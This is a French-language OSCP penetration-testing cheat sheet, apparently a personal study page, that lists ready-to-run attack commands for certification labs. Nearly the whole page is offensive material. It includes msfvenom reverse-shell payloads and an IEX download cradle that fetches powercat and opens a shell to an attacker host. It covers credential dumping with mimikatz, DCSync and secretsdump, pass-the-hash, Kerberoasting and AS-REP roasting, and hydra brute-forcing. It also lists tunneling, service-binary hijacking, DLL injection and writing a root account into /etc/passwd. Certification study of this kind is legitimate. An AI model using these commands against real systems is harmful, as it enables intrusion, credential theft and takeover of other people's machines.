
# Antisèche OSCP

https://github.com/swisskyrepo/PayloadsAllTheThings
<br /> https://www.exploit-db.com/
<br /> https://book.hacktricks.xyz/
<br /> https://www.revshells.com/

## Transfert / Tunneling

**SMB**

    impacket-smbserver smb dossier/ -smb2support -debug
    ...
    copy Passwords.kdbx \\192.168.50.100\smb\
    copy \\192.168.50.100\smb\Rubeus.exe .\Rubeus.exe

**Web (Apache)**

    sudo systemctl start apache2
    sudo cp mimikatz.exe /var/www/html
    ...
    certutil.exe -urlcache -f http://192.168.50.100/mimikatz.exe mimikatz.exe

**Web (Python 3)**

    python -m http.server 8000
    ...
    Invoke-WebRequest -Uri http://192.168.50.100:8000/mimikatz.exe -Outfile ./mimikatz.exe

**Web (Python 2)**

    python2.7 -m SimpleHTTPServer 8000
    ...
    Invoke-WebRequest -Uri http://192.168.50.100:8000/mimikatz.exe -Outfile ./mimikatz.exe

**SSH**

    sudo systemctl start ssh
    ...
    scp ./fichier_local timothe@192.168.50.100:/home/dossier
    scp timothe@192.168.50.100:/home/dossier/fichier_distant ./
    
**Evil-WinRM**

    sudo proxychains evil-winrm -u Tim -p 'Mdp123' -i 10.10.100.100
    upload /var/www/html/winpeas.exe
    ...
    download resultat.txt

**WebDAV**

    ~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
    ...
    net use * http://192.168.50.100
    copy fichier_local Z:\
    copy Z:\fichier_distant ./

**Chisel**

    vim /etc/proxychains4.conf
    ./chisel_linux_1.7.7 server -reverse -p 9999
    ...
    Invoke-WebRequest -Uri http://192.168.50.100/chisel_1.7.7_windows_amd64.exe -Outfile .\chisel.exe
    .\chisel.exe client 192.168.50.100:9999 R:socks

**SSH Local Port Forwarding**

    ssh -N -L 0.0.0.0:4455:172.16.100.100:445 database_admin@10.4.100.100
    -----
    ss -ntplu
    smbclient -p 4455 -L //192.168.100.100/ -U Tim --password=Mdp123

**SSH Dynamic Port Forwarding**

    ssh -N -D 0.0.0.0:9999 database_admin@10.4.100.100
    -----
    echo “socks5 192.168.100.100 9999” >> /etc/proxychains4.conf
    vim /etc/proxychains4.conf


**SSH Remote Port Forwarding**

    ssh -N -R 127.0.0.1:2345:10.4.100.100:5432 timothe@192.168.50.100
    -----
    psql -h 127.0.0.1 -p 2345 -U postgres

**SSH Remote Dynamic Port Forwarding**

    ssh -N -R 9998 timothe@192.168.50.100
    -----
    sudo systemctl start ssh
    sudo ss -ntplu
    echo “socks5 127.0.0.1 9998” >> /etc/proxychains4.conf
    sudo vim /etc/proxychains4.conf
    
## Reverse-shells 

    msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
    msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
    msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.50.100 LPORT=443 -f exe > /var/www/html/msfvenom.exe
    IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.50.100/powercat.ps1'); powercat -c 192.168.50.100 -p 443 -e powershell
    ...
    rlwrap nc -nvlp  443
    msfconsole -x "use exploit/multi/handler;set payload windows/powershell_reverse_tcp;set LHOST 192.168.50.100;set LPORT 443;run;"
    ...
    

## Énumération	

### DNS / Virtual hosts

    host www.domaine.com
    host -t MX www.domaine.com
    for nom in $(cat liste.txt) ; do host \$nom.site.com ; done
    for ip in $(seq 200 254) ; do host 192.168.100.$ip ; done | grep -v "not found" 
    dnsrecon -d domaine.com -t std
    dnsrecon -d domaine.com -D wordlist.txt -t brt
    dnsenum domaine.com

### Port scanning

    nmap -p- -sV -T4 $IP -oN nmap_100.txt
    nmap -Pn -p- --min-rate 100 $IP -T4 --open
    nmap -T4 -A -v $IP
    ...
    sudo  /home/timothe/.local/bin/autorecon $IP
    sudo masscan -p1-65535,U:1-65535 $IP -e tun0  > ports_100.txt
    ...
    proxychains -q nmap -vvv -sT --top-ports=50 -Pn $IP

### SMB

	enum4linux $IP
	enum4linux -a $IP
	nmblookup -A $IP
    nmap -sV -sT -p445 --script vuln $IP
	nmap -sV -sT -p445 --script safe $IP
	nmap -sV -sT -p445 --script "vuln and safe" $IP
	smbclient --no-pass -L //$IP


### Web

**Généralités**

    - Penser à tenter le nom de domaine au lieu de l'adresse IP
    - Inspecter le code source de chaque nouvelle page trouvée
    - Inspecter les différents CMS et les différentes technologies de chaque nouvelle page trouvée
    - Tenter les credentials par défaut de chaque service et notamment pour les CMS
    - Faire du fuzzing sur chaque nouvelle page trouvée
    - Lancer un scan Nikto sur chaque service web

**Wordlists**

    /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    /usr/share/wordlists/dirb/big.txt
    /usr/share/wordlists/dirb/common.txt
    /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
    /usr/share/wordlists/seclists/Discovery/Web-Content/dirsearch.txt
    /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
    /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
    /usr/share/wordlists/jhaddix_all.txt

**Dossiers**

    feroxbuster --silent -u http://monsite.com/
    dirb http://monsite.com/
    gobuster dir -u http://monsite.com -w ~/ma_liste.txt
    ffuf -u http://monsite.com/FUZZ -w ~/ma_liste.txt

**Fichiers**

    ffuf -u http://192.168.100.100/dossier/FUZZ -w ~/ma_liste.txt -e .pdf,.php,.txt,.ini,.conf,.log,.html,.js,.bak,.aspx,.asp,.zip -fc 403
    
**Paramètres** 

    ffuf -u http://192.168.100.100/dossier/page.php?FUZZ=aaaaa -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fs 0
    ffuf -u http://192.168.100.100/dossier/page.php?FUZZ=12345 -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fs 0
    ffuf -u http://192.168.100.100/dossier/page.php?FUZZ=/etc/passwd -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fs 0

**Virtual hosts**

    ffuf  -u http://FUZZ.monsite.com -w  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    
**Dossier .git exposé**

    wget --mirror --convert-links --no-parent --wait=0.5 http://192.168.100.100/.git/
    ~/git-extractor.sh .git DUMP_GIT 
    git log 
    git show 
    git gui 



## Windows / Active Directory

### Ne pas oublier

	- Il faut tester certains protocoles manuellement parce qu'il y a parfois des faux-négatifs sur CrackMapExec
	- Regarder les comptes kerberoastables sur BloodHound
	- Regarder les historiques Powershell de chaque utilisateur et aller voir manuellement dans chaque chemin
	- Ne surtout pas négliger les comptes qui ont l'air moins importants comme "support" ou "web_svc"
 	- Ajouter les nouveaux domaines découverts dans /etc/hosts

### Téléchargements utiles

    iwr -Uri http://192.168.50.100/winpeas.exe -Outfile .\winpeas.exe
    iwr -Uri http://192.168.50.100/adpeas.ps1 -Outfile .\adpeas.ps1
    iwr -Uri http://192.168.50.100/adpeas-light.ps1 -Outfile .\adpeas-light.ps1
    iwr -Uri http://192.168.50.100/nc.exe -Outfile .\nc.exe
    iwr -Uri http://192.168.50.100/mimikatz.exe -Outfile .\mimikatz.exe
    iwr -Uri http://192.168.50.100/Rubeus.exe -Outfile .\Rubeus.exe
    iwr -Uri http://192.168.50.100/PrintSpoofer.exe -Outfile .\PrintSpoofer.exe
    iwr -Uri http://192.168.50.100/JuicyPotatoNG.exe -Outfile .\JuicyPotatoNG.exe
    iwr -Uri http://192.168.50.100/Seatbelt.exe -Outfile .\Seatbelt.exe
    iwr -Uri http://192.168.50.100/Powercat.ps1 -Outfile .\Powercat.ps1
    iwr -Uri http://192.168.50.100/SharpHound.ps1 -Outfile .\SharpHound.ps1
    Import-Module ./Sharphound.ps1
    iwr -Uri http://192.168.50.100/PrivEscCheck.ps1 -Outfile .\PrivEscCheck.ps1
    Import-Module PrivEscCheck.ps1
    iwr -Uri http://192.168.50.100/Powerview.ps1 -Outfile .\Powerview.ps1
    Import-Module ./Powerview.ps1

### Commandes utiles

**Récupération de credentials**

    impacket-secretsdump DOMAINE/Tim:Mdp123@192.168.100.100
    

**Connexion à distance**

	krdc
    xfreerdp /v:192.168.100.100 /u:Tim /cert:ignore /d:DOMAINE /p:Mdp123
    rdesktop -u Tim 192.168.100.100
    evil-winrm -u Tim -p Mdp123 -i 192.168.100.100
    impacket-smbclient DOMAINE/Tim:'Mdp123'@192.168.100.100
    impacket-wmiexec DOMAINE/Tim:Mdp123@192.168.100.100
    impacket-psexec DOMAINE/Tim:Mdp123@192.168.100.100 powershell.exe
    
**CrackMapExec**

Protocoles à tester : SMB, WINRM, RDP, MSSQL, FTP, LDAP, SSH
<br /> Options à tester : --lsa, --sam, --ntds, --shares, --sessions,  --loggedon-users, ...

	crackmapexec smb adresses.txt -u tim -p Mdp123 --continue-on-success -d DOMAINE
	crackmapexec smb 192.168.100.100 -u users.txt -p Mdp123 --continue-on-success -d DOMAINE
	crackmapexec smb adresses.txt -u tim -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx --continue-on-success 
	crackmapexec smb adresses.txt -u users.txt -p passwords.txt --continue-on-success 
	crackmapexec smb 192.168.100.100 -u Tim -p Mdp123 --continue-on-success --local-auth
	crackmapexec smb adresses.txt -u users.txt -p passwords.txt --continue-on-success 

**Bloodhound** 

	 ~/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
	 sudo neo4j start
	 bloodhound
	 -----
    iwr -Uri http://192.168.50.100/SharpHound.ps1 -Outfile .\SharpHound.ps1
    Import-Module .\SharpHound.ps1
    Invoke-BloodHound -CollectionMethod All
    net use * http://192.168.50.100
    cp 2023XXXXXXXXXX_BloodHound.zip Z:\
	-----
		MATCH (m:Computer) RETURN m
		MATCH (m:User) RETURN m
		MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

**Mouvement latéral** 

    ./PsExec64.exe -i  \\FILES01 -u DOMAINE\Tim -p Mdp123 powershell.exe
    ----- OU -----
    wmic /node:192.168.100.100 /user:Tim /password:Mdp123 process call create "calc"
    ----- OU -----
    winrs -r:files01 -u:Tim -p:Mdp123  "cmd /c hostname & whoami"
    ----- OU -----
    $username = 'Tim';
    $password = 'Mdp123';
    $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
    $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

    $options = New-CimSessionOption -Protocol DCOM
    $session = New-CimSession -ComputerName 192.168.100.100 -Credential $credential -SessionOption $Options 
    $command = 'calc';

    Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

**Mimikatz**

    ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
    ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
    ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"
    ./mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:DOMAINE\Tim"
    
   
**Rubeus**

    ./Rubeus.exe asreproast /nowrap
    ./Rubeus.exe brute /password:Mdp123 /noticket
    ./Rubeus.exe kerberoast /outfile:hashes.kerberoast
    
**Pass the Hash** 

    smbclient //192.168.100.100/share -U Tim --pw-nt-hash xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    ----- OU -----
    impacket-psexec -hashes 00000000000000000000000000000000:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Tim@192.168.100.100 powershell.exe
    ----- OU -----
    impacket-wmiexec -hashes 00000000000000000000000000000000:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Tim@192.168.100.100

**AS-REP Roasting** 

    impacket-GetNPUsers -dc-ip 192.168.100.100 -request -OutputFile asreproast.txt DOMAINE/Tim
    ----- OU -----
    C:\tools\Rubeus.exe asreproast /nowrap
    ...
    hashcat -m 18200 asreproast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

**Kerberoasting**

    impacket-GetUserSPNs -request -dc-ip 192.168.100.100 DOMAINE/Tim
    ----- OU -----
    .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
    ...
    sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

**DC Sync**

    C:\tools\mimikatz.exe
    mimikatz # lsadump::dcsync /user:DOMAINE\Jack
    ----- OU -----
    impacket-secretsdump -just-dc-user Jack DOMAINE/Tim:Mdp123@192.168.100.100

## Privilege Escalation

### Windows

**Victoire directe**

    ./JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c powershell -nop -w hidden -e [Reverse-shell Base64]"
    ./PrintSpoofer.exe -c "cmd.exe"

**Reconnaissance sommaire sans outils**

    whoami /priv
    whoami /groups
    systeminfo
    ipconfig /all
    route print
    netstat -ano
    ((Get-PSReadlineOption).HistorySavePath)
    dir C:\
    schtasks /query /fo LIST /v | Select-String Author,TaskName
    Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
    Get-LocalUser
    Get-LocalGroup
    Get-LocalGroupMember
    Get-Process
    Get-Service
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName
    Get-ChildItem -Path C:\ -Include *.log -File -Recurse -ErrorAction SilentlyContinue

**Remplacement de service mal configuré**

    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.50.100 LPORT=8888 -f exe -o rev_tcp.exe
    ...
    iwr -Uri http://192.168.50.100/rev_tcp.exe -Outfile .\rev_tcp.exe
    Rename-Item C:\Dossier\MonService.exe C:\Dossier\MonService_old.exe
    Copy-Item .\rev_tcp.exe C:\Dossier\MonService.exe
    net stop MonService
    net start MonService

**Injections de DLL manquantes**

    C:\tools\Procmon\Procmon64.exe
    Restart-Service MonService
    ...
    x86_64-w64-mingw32-gcc MaDLL.cpp --shared -o MaDLL.dll
    msfvenom -p windows/shell/reverse_tcp LHOST=192.168.50.100 LPORT=9999 -f dll > shell.dll
    ...
    iwr -uri http://192.168.50.100/MaDLL.dll -Outfile MaDLL.dll
    iwr -uri http://192.168.50.100/shell.dll -Outfile MaDLL2.dll
    Restart-Service MonService

### Linux

**LinPEAS** 

	cd /tmp
    wget http://192.168.50.100/linpeas.sh
    chmod u+x linpeas.sh
    ./linpeas.sh | tee resultat.txt
    scp ./resultat.txt timothe@192.168.50.100:/home/timothe/resultat.txt
    less -R resultat.txt

**Clés SSH** 

    cat home/user/.ssh/id_rsa
    cat home/user/.ssh/id_dsa
    cat home/user/.ssh/id_ecdsa
    cat home/user/.ssh/id_ecdsa_sk
    cat home/user/.ssh/id_ed25519
    cat home/user/.ssh/id_ed25519_sk
    
**Divers**

    find / -name "user.keystore" 2>/dev/null
    find / -name "login.keyring" 2>/dev/null
    find / -name "pubring.kbx" 2>/dev/null
    find / -name "trustdb.gpg" 2>/dev/null
    
    
 **Injection de compte root dans /etc/passwd**
 
    openssl passwd -1 mdp123
    echo 'tim:$1$cNCh34ba$5KLgSZbxX0baUnEB66yoZ1:0:0:/root/:/bin/bash' >> /etc/passwd
    su tim
    ls /root

## Bruteforcing

### Wordlists et sites

    /usr/share/wordlists/rockyou.txt
    /usr/share/wordlists/fasttrack.txt
    /usr/share/wordlists/dirb/others/names.txt
    https://crackstation.net/
    https://www.onlinehashcrack.com/

### Commandes

    hydra -vV -l tim -P /usr/share/wordlists/rockyou.txt 192.168.100.100 -s 2222 ssh
    hydra -vV -f -l root -P /usr/share/wordlists/rockyou.txt 192.168.100.100 mysql
    hydra -vV -L /usr/share/wordlists/dirb/others/names.txt -p "Mdp123" rdp://192.168.100.100
    hydra -vV -l tim -P /usr/share/wordlists/rockyou.txt 192.168.100.100 http-post-form "/index.php:user=user&password=\^PASS\^:Invalid"
    hydra -vV -l tim -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.100.100 http-get

## Bases de données 

### Connexion

**MS-SQL**

    impacket-mssqlclient Admin:Mdp123@192.168.100.100 -windows-auth
    -----
    sqsh -U sa -P password -S 192.168.100.100:1433 -D MaBDD
    -----
    sqlcmd -U 'Admin' -S 'localhost\SQLEXPRESS' -P ‘Mdp123’

**MySQL**

    mysql -u root -p 'root' -h 192.168.100.100 -P 3306

### Exploitation

**MS-SQL**

    SELECT name FROM sys.databases;
    SELECT * FROM Ma_BDD.information_schema.tables;
    SELECT uid, status, name FROM master.dbo.sysusers;
    SELECT * FROM Ma_BDD.dbo.table
	-----
    EXECUTE sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXECUTE sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    EXEC master..xp_cmdshell "whoami"

**MySQL**

    mysql> SHOW DATABASES;
    mysql> SHOW TABLES FROM mysql;
    mysql> SHOW COLUMNS FROM mysql.users;
    mysql> SELECT user, password FROM mysql.user WHERE user = 'tim';




